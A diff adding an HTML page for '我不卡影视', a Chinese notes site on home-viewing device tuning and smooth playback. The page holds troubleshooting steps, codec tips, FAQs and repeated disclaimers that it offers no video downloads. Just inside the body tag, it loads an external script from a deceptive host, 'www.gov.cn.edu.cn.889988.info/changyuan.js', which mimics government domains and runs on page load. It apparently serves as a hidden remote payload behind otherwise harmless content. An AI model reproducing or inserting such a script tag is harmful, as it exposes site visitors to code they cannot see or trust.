@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="我不卡影视是一个专注于家庭观影设备调试与播放流畅度优化的独立笔记站。在这里整理投影仪摆放、网络带宽分配、片源编码格式、投屏设置等实操经验，用通俗的语言讲清楚卡顿到底出在哪一步。所有内容均为原创整理，不涉及任何影视资源的下载、转载或在线播放服务。">
+<meta name="keywords" content="家庭观影设备,播放流畅度优化,投影仪调试,片源编码格式,投屏设置,网络带宽分配,解码器设置,观影卡顿排查">
+<title>我不卡影视｜家庭观影设备调试与播放流畅度优化笔记 · 我不卡影视</title>
+<style>
+:root{
+  --paper:#f2f7f4;
+  --paper2:#e6efea;
+  --ink:#17302a;
+  --ink2:#34544b;
+  --mint:#2f7d67;
+  --mint2:#5aa88c;
+  --clay:#c8622f;
+  --line:#c9d8d0;
+  --soft:#fafcfb;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"SimSun",serif;
+  font-size:16px;
+  line-height:1.85;
+}
+a{color:var(--mint);text-decoration:none}
+a:hover{color:var(--clay);border-bottom:1px solid var(--clay)}
+
+/* ===== 顶部信息带 ===== */
+.topband{
+  background:var(--ink);
+  color:#dfebe6;
+  font-family:"Helvetica Neue",Arial,"PingFang SC","Microsoft YaHei",sans-serif;
+  font-size:12.5px;
+  letter-spacing:.04em;
+}
+.topband .wrap{
+  max-width:1180px;margin:0 auto;padding:8px 22px;
+  display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;
+}
+.topband b{color:#fff;font-weight:600;letter-spacing:.08em}
+.topband span em{font-style:normal;color:var(--mint2)}
+
+/* ===== 刊头 ===== */
+.masthead{
+  border-bottom:3px double var(--mint);
+  padding:38px 22px 22px;
+  text-align:center;
+  background:linear-gradient(180deg,var(--paper2),var(--paper));
+}
+.masthead .eyebrow{
+  font-family:"Helvetica Neue",Arial,sans-serif;
+  font-size:12px;letter-spacing:.34em;color:var(--clay);text-transform:uppercase;
+}
+.masthead h1{
+  margin:14px 0 6px;
+  font-size:44px;
+  letter-spacing:.16em;
+  color:var(--ink);
+  font-weight:700;
+}
+.masthead .sub{
+  font-size:15px;color:var(--ink2);max-width:660px;margin:0 auto;
+  font-family:"Songti SC","Source Han Serif SC",Georgia,serif;
+}
+.masthead .rule{width:74px;height:3px;background:var(--clay);margin:18px auto 0}
+
+/* ===== 导航 ===== */
+nav.tabs{
+  position:sticky;top:0;z-index:20;
+  background:rgba(242,247,244,.94);
+  backdrop-filter:blur(6px);
+  border-bottom:1px solid var(--line);
+  font-family:"Helvetica Neue",Arial,"PingFang SC",sans-serif;
+}
+nav.tabs .wrap{
+  max-width:1180px;margin:0 auto;padding:0 14px;
+  display:flex;flex-wrap:wrap;gap:4px;
+}
+nav.tabs a{
+  display:inline-block;padding:13px 16px;font-size:14px;color:var(--ink2);
+  border-bottom:2px solid transparent;letter-spacing:.04em;
+}
+nav.tabs a:hover{border-bottom-color:var(--clay);color:var(--clay)}
+
+/* ===== 布局 ===== */
+.container{max-width:1180px;margin:0 auto;padding:40px 22px 60px}
+section{padding-top:44px;margin-top:44px;border-top:1px solid var(--line)}
+section:first-of-type{border-top:none;margin-top:0;padding-top:0}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:8px;flex-wrap:wrap}
+.sec-head .num{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;font-weight:700;
+  color:#fff;background:var(--mint);border-radius:50%;
+  width:30px;height:30px;display:inline-flex;align-items:center;justify-content:center;flex:0 0 auto;
+}
+.sec-head h2{
+  margin:0;font-size:26px;letter-spacing:.06em;color:var(--ink);
+}
+.sec-head .en{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:11.5px;letter-spacing:.2em;
+  color:var(--mint2);text-transform:uppercase;
+}
+.lead{color:var(--ink2);font-size:15.5px;margin:0 0 26px}
+
+/* ===== 诊断条 ===== */
+.diag{border:1px solid var(--line);background:var(--soft);padding:22px 24px;border-radius:4px}
+.diag ol{margin:0;padding-left:0;list-style:none;counter-reset:d}
+.diag li{
+  counter-increment:d;position:relative;padding:10px 0 10px 42px;
+  border-bottom:1px dashed var(--line);font-size:15.5px;
+}
+.diag li:last-child{border-bottom:none}
+.diag li::before{
+  content:counter(d);position:absolute;left:0;top:10px;
+  font-family:"Helvetica Neue",Arial,sans-serif;font-weight:700;font-size:13px;
+  color:var(--mint);border:1px solid var(--mint);border-radius:50%;
+  width:26px;height:26px;display:flex;align-items:center;justify-content:center;
+}
+.diag li b{color:var(--clay)}
+
+/* ===== 设备卡 ===== */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.card{
+  background:var(--soft);border:1px solid var(--line);border-top:4px solid var(--mint);
+  padding:20px 18px;border-radius:4px;
+}
+.card h3{margin:0 0 10px;font-size:18px;color:var(--ink);letter-spacing:.04em}
+.card p{margin:0;font-size:14.5px;color:var(--ink2);line-height:1.75}
+.card .tag{
+  display:inline-block;margin-top:14px;font-family:"Helvetica Neue",Arial,sans-serif;
+  font-size:11px;letter-spacing:.1em;color:var(--mint2);
+  border:1px solid var(--line);padding:3px 9px;border-radius:20px;
+}
+
+/* ===== 表格 ===== */
+.tblwrap{overflow-x:auto;border:1px solid var(--line);background:var(--soft);border-radius:4px}
+table{width:100%;border-collapse:collapse;min-width:660px;font-size:14.5px}
+th,td{padding:13px 16px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--ink);color:#fff;font-weight:600;letter-spacing:.05em;
+   font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px}
+tr:nth-child(even) td{background:#eef6f2}
+td b{color:var(--clay)}
+tfoot td{background:var(--paper2);font-size:13.5px;color:var(--ink2)}
+
+/* ===== 双栏笔记 ===== */
+.twocol{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.note{background:var(--soft);border:1px solid var(--line);border-left:4px solid var(--clay);padding:20px 22px;border-radius:4px}
+.note h3{margin:0 0 6px;font-size:19px;color:var(--ink)}
+.note .meta{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:12px;color:var(--mint2);
+  letter-spacing:.08em;margin-bottom:12px;
+}
+.note p{margin:0 0 12px;font-size:15px;color:var(--ink2)}
+.note p:last-child{margin-bottom:0}
+.note p b{color:var(--ink)}
+
+/* ===== FAQ ===== */
+details.faq{
+  background:var(--soft);border:1px solid var(--line);border-radius:4px;
+  margin-bottom:10px;padding:0 20px;
+}
+details.faq summary{
+  cursor:pointer;padding:16px 0;font-size:16px;font-weight:600;color:var(--ink);
+  list-style:none;position:relative;padding-right:34px;
+}
+details.faq summary::-webkit-details-marker{display:none}
+details.faq summary::after{
+  content:"+";position:absolute;right:0;top:12px;font-size:22px;color:var(--mint);
+  font-family:"Helvetica Neue",Arial,sans-serif;font-weight:400;
+}
+details.faq[open] summary::after{content:"–"}
+details.faq p{padding-bottom:16px;margin:0;font-size:15px;color:var(--ink2);border-top:1px dashed var(--line);padding-top:14px}
+details.faq p b{color:var(--clay)}
+
+/* ===== 关于 ===== */
+.about{background:var(--ink);color:#e2ece8;padding:30px 32px;border-radius:5px}
+.about h3{margin:0 0 14px;font-size:22px;color:#fff;letter-spacing:.06em}
+.about p{margin:0 0 14px;font-size:15px;color:#cddbd5;line-height:1.9}
+.about p:last-child{margin-bottom:0}
+.about .siteurl{
+  display:inline-block;font-family:"Helvetica Neue",Arial,monospace;font-size:13.5px;
+  color:#fff;background:rgba(255,255,255,.09);padding:6px 13px;border-radius:3px;letter-spacing:.03em;
+}
+
+/* ===== 页脚 ===== */
+footer{background:var(--ink);color:#c4d3cd;padding:38px 22px 26px;margin-top:60px}
+footer .wrap{max-width:1180px;margin:0 auto}
+.footgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:26px;padding-bottom:26px;border-bottom:1px solid #31544b}
+.footgrid h4{margin:0 0 10px;font-size:15px;color:#fff;letter-spacing:.08em}
+.footgrid p,.footgrid li{font-size:13.5px;line-height:1.9;margin:0;color:#b9cac3;
+  font-family:"Helvetica Neue",Arial,"PingFang SC",sans-serif}
+.footgrid ul{padding-left:18px}
+.copy{text-align:center;font-size:12.5px;color:#93aaa2;padding-top:20px;
+  font-family:"Helvetica Neue",Arial,monospace;letter-spacing:.04em}
+.copy b{color:#e6efea}
+
+/* ===== 响应式 ===== */
+@media (max-width:960px){
+  .grid4{grid-template-columns:repeat(2,1fr)}
+  .twocol{grid-template-columns:1fr}
+  .masthead h1{font-size:34px}
+}
+@media (max-width:640px){
+  body{font-size:15.5px}
+  .container{padding:28px 16px 44px}
+  section{padding-top:34px;margin-top:34px}
+  .masthead h1{font-size:27px;letter-spacing:.1em}
+  .masthead .sub{font-size:14px}
+  .sec-head h2{font-size:21px}
+  .grid4{grid-template-columns:1fr}
+  .footgrid{grid-template-columns:1fr;gap:20px}
+  .topband .wrap{font-size:11.5px}
+  nav.tabs a{padding:11px 12px;font-size:13px}
+  .about{padding:24px 20px}
+}
+@media (max-width:420px){
+  .masthead h1{font-size:22px}
+  .topband .wrap{gap:6px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="topband">
+  <div class="wrap">
+    <span><b>我不卡影视</b> · 家庭观影设备与播放流畅度笔记</span>
+    <span>独立整理 · 原创内容 · 官方网址 <em>https://wobukayingshi-top.github.io</em></span>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="eyebrow">Home Viewing Tuning Notes</div>
+  <h1>我不卡影视</h1>
+  <p class="sub">把卡顿这件事拆开来看：到底是网络、设备、编码，还是摆放位置的锅。这里只整理调试方法与观看经验，不提供任何影视资源的下载或播放。</p>
+  <div class="rule"></div>
+</header>
+
+<nav class="tabs">
+  <div class="wrap">
+    <a href="#check">卡顿自查</a>
+    <a href="#device">设备调试</a>
+    <a href="#format">编码对照</a>
+    <a href="#note">调试笔记</a>
+    <a href="#faq">常见问答</a>
+    <a href="#about">关于本站</a>
+  </div>
+</nav>
+
+<div class="container">
+
+  <section id="check">
+    <div class="sec-head">
+      <span class="num">1</span>
+      <h2>卡顿自查</h2>
+      <span class="en">Troubleshooting Order</span>
+    </div>
+    <p class="lead">顺序比工具重要。多数时候，按下面五步走一遍，问题就浮出来了，根本用不着换设备。</p>
+    <div class="diag">
+      <ol>
+        <li><b>先看是哪一环卡。</b>片头加载慢、中途转圈、还是声音断断续续？三种现象指向完全不同。</li>
+        <li><b>换一台设备试同一部片。</b>手机不卡、电视卡，问题在电视端；都卡，问题多半在网络或片源本身。</li>
+        <li><b>测实际带宽而非标称速率。</b>晚上八点测一次，数值通常比白天低三成以上。</li>
+        <li><b>检查是不是无线信号抢道。</b>隔壁家的路由器、蓝牙音箱、甚至微波炉，都能把 5G 频段搅乱。</li>
+        <li><b>最后才动画质设置。</b>先降到中等档位跑通，再往上加。一步到位往往找不到真正的瓶颈。</li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="device">
+    <div class="sec-head">
+      <span class="num">2</span>
+      <h2>设备调试</h2>
+      <span class="en">Device Setup</span>
+    </div>
+    <p class="lead">设备调试的回报通常比换设备更高。同样一台投影，位置挪三十厘米，画面通透度就可能差一档。</p>
+    <div class="grid4">
+      <div class="card">
+        <h3>投影摆放</h3>
+        <p>正投优先，尽量让光轴与幕布垂直。侧投靠梯形校正补回来的画面，边缘往往会发虚，这是物理规律，不是机器差。</p>
+        <span class="tag">光轴</span>
+      </div>
+      <div class="card">
+        <h3>电视画面</h3>
+        <p>多数出厂预设的运动补偿开得太猛，人物边缘会拖出残影。把它关掉或调到最低，画面反而更像电影。</p>
+        <span class="tag">运动补偿</span>
+      </div>
+      <div class="card">
+        <h3>音响与回音</h3>
+        <p>对白听不清，九成是摆位问题而不是音量问题。把中置音箱抬高到与耳齐平，效果立竿见影。</p>
+        <span class="tag">中置摆位</span>
+      </div>
+      <div class="card">
+        <h3>网络布线</h3>
+        <p>能拉网线就别用无线中继。中继器省了施工，却把延迟翻倍，看高码率内容时最先扛不住的就是它。</p>
+        <span class="tag">有线优先</span>
+      </div>
+    </div>
+  </section>
+
+  <section id="format">
+    <div class="sec-head">
+      <span class="num">3</span>
+      <h2>编码对照</h2>
+      <span class="en">Codec Reference</span>
+    </div>
+    <p class="lead">同一部片子，封装格式不同，对设备的要求可以差出好几倍。这张表只作识别参考，不涉及任何资源获取。</p>
+    <div class="tblwrap">
+      <table>
+        <thead>
+          <tr><th>常见封装</th><th>对设备的要求</th><th>常见现象</th><th>优先排查方向</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><b>MP4 / H.264</b></td><td>低，十年前的设备也能硬解</td><td>基本不卡，兼容性最好</td><td>卡了先查网络</td></tr>
+          <tr><td><b>MKV / H.265</b></td><td>中等，需要设备支持硬解</td><td>老电视容易掉帧、风扇狂转</td><td>开硬解，或换播放器</td></tr>
+          <tr><td><b>高码率 REMUX</b></td><td>高，考验读取与带宽</td><td>动作场面突然卡顿</td><td>硬盘速度、网线速率</td></tr>
+          <tr><td><b>VP9 / AV1</b></td><td>较新设备才支持</td><td>浏览器能播，电视端未必</td><td>确认设备解码支持列表</td></tr>
+        </tbody>
+        <tfoot>
+          <tr><td colspan="4">提示：以上仅用于识别播放瓶颈。我不卡影视不提供任何文件下载，请通过正规授权渠道获取内容后自行调试。</td></tr>
+        </tfoot>
+      </table>
+    </div>
+  </section>
+
+  <section id="note">
+    <div class="sec-head">
+      <span class="num">4</span>
+      <h2>调试笔记</h2>
+      <span class="en">Field Notes</span>
+    </div>
+    <p class="lead">这些是实际调试时留下的记录，有成功也有翻车，重点都写在教训里。</p>
+    <div class="twocol">
+      <article class="note">
+        <h3>别急着换路由器</h3>
+        <div class="meta">2026.05 · 家庭无线</div>
+        <p>一台用了五年的路由器，把信道从自动改成固定之后，客厅的丢包率直接从百分之十二降到百分之一。换设备之前，先把能调的设置调完。</p>
+        <p><b>教训：</b>自动信道在密集住宅楼里几乎永远不是最优解，因为它会在拥堵时来回跳，跳的那几秒就是转圈的时候。</p>
+      </article>
+      <article class="note">
+        <h3>幕布比投影仪便宜，却更影响观感</h3>
+        <div class="meta">2026.03 · 投影系统</div>
+        <p>白墙的漫反射不干净，暗部会发灰。一块合格的幕布，增益不必高，但要均匀。很多人花两万买机器、却在墙上投，是最亏的搭配。</p>
+        <p><b>教训：</b>增益越高，可视角度越窄，一家人坐在两侧时颜色差异会很明显。</p>
+      </article>
+      <article class="note">
+        <h3>电视的"影院模式"其实很靠谱</h3>
+        <div class="meta">2026.01 · 画面设置</div>
+        <p>厂商的预设里，通常只有"影院"或"电影"这一档是按接近标准色温调的，其余档位都在讨好第一眼的鲜艳感。想省事，直接锁这一档。</p>
+        <p><b>教训：</b>动态对比度这类功能会实时改 gamma，看暗场戏时人物会忽明忽暗。</p>
+      </article>
+      <article class="note">
+        <h3>5.1 声道接错，不如 stereo</h3>
+        <div class="meta">2025.11 · 音频接线</div>
+        <p>把环绕音箱接成前置，声场会整个倒过来，对白从身后传来。接完线之后用测试音逐个核对，三分钟能省掉两小时的困惑。</p>
+        <p><b>教训：</b>功放的自动校准麦克风别省，但它测出来的距离值要手动再核一遍。</p>
+      </article>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="sec-head">
+      <span class="num">5</span>
+      <h2>常见问答</h2>
+      <span class="en">FAQ</span>
+    </div>
+    <p class="lead">被问得最多的几个问题，答案都尽量写得可以直接照着做。</p>
+
+    <details class="faq" open>
+      <summary>我不卡影视能提供影视资源下载吗？</summary>
+      <p><b>不能。</b>本站的定位是家庭观影设备调试与播放流畅度优化的笔记整理，不涉及任何影视资源的下载、转载或在线播放。影片请通过正规授权渠道获取后，再参考本站的方法自行调试设备。</p>
+    </details>
+
+    <details class="faq">
+      <summary>为什么画面一卡一卡的，但网速测出来很快？</summary>
+      <p>网速和稳定性是两回事。测速看的是瞬时峰值，而看片子依赖的是持续稳定的带宽。晚上高峰时段、无线信号干扰、路由器 NAT 性能不足，都会让实际可用带宽大幅波动。建议用有线连接做对比测试。</p>
+    </details>
+
+    <details class="faq">
+      <summary>老电视播放高码率视频很吃力，一定要换吗？</summary>
+      <p>不一定。加一个支持硬解新编码的电视盒子，成本只有换电视的零头，效果往往就够了。先确认老电视的 HDMI 接口版本是否支持目标分辨率和刷新率。</p>
+    </details>
+
+    <details class="faq">
+      <summary>投影仪标称亮度很高，为什么白天还是看不清？</summary>
+      <p>标称亮度多按峰值测，而实际观感取决于环境光。遮光窗帘带来的提升，常常比换一台更亮的机器更明显，也更便宜。先遮光，再谈亮度。</p>
+    </details>
+
+    <details class="faq">
+      <summary>怎样确认我的设备支持某种编码格式？</summary>
+      <p>查官方规格页里的"视频解码"一栏，而不是看商品标题。很多标着"4K"的机器只支持 H.264 的 4K，碰到 H.265 就只有软解，自然卡顿。实在拿不准，用一小段测试片试播最可靠。</p>
+    </details>
+
+    <details class="faq">
+      <summary>我不卡影视的更新频率是怎样的？</summary>
+      <p>没有固定排期，遇到值得记的调试案例就会补上。内容以原创经验整理为主，不转载、不搬运，因此更新慢，但每篇都能直接照着操作。</p>
+    </details>
+  </section>
+
+  <section id="about">
+    <div class="sec-head">
+      <span class="num">6</span>
+      <h2>关于本站</h2>
+      <span class="en">About</span>
+    </div>
+    <div class="about">
+      <h3>关于「我不卡影视」</h3>
+      <p>我不卡影视是一个由个人维护的家庭观影设备与播放流畅度笔记站。内容围绕投影摆放、电视画面设置、音响接线、网络布线、编码格式识别等实操话题，用尽量直白的话讲清楚卡顿到底出在哪一步。</p>
+      <p>本站所有文章均为原创整理，<b>不提供任何影视资源的下载、转载或在线播放服务</b>，也不包含任何第三方资源链接。如需观看影视内容，请通过正规授权渠道获取。</p>
+      <p>官方网址：<span class="siteurl">https://wobukayingshi-top.github.io</span></p>
+      <p>如果在调试过程中遇到本文没有覆盖的情况，欢迎通过站点说明里的渠道留言，我会把有代表性的案例整理成新的笔记。</p>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="footgrid">
+      <div>
+        <h4>关于我不卡影视</h4>
+        <p>家庭观影设备调试与播放流畅度优化的独立笔记站，内容均为原创整理。</p>
+      </div>
+      <div>
+        <h4>内容范围</h4>
+        <ul>
+          <li>投影与电视的画面调试</li>
+          <li>音响摆位与接线</li>
+          <li>网络布线与编码识别</li>
+        </ul>
+      </div>
+      <div>
+        <h4>官方网址</h4>
+        <p>https://wobukayingshi-top.github.io<br>本站不涉及任何资源下载与在线播放。</p>
+      </div>
+    </div>
+    <div class="copy">© <span id="yr"></span> 我不卡影视 · 独立笔记站 · 不提供任何影视资源下载或在线播放服务</div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
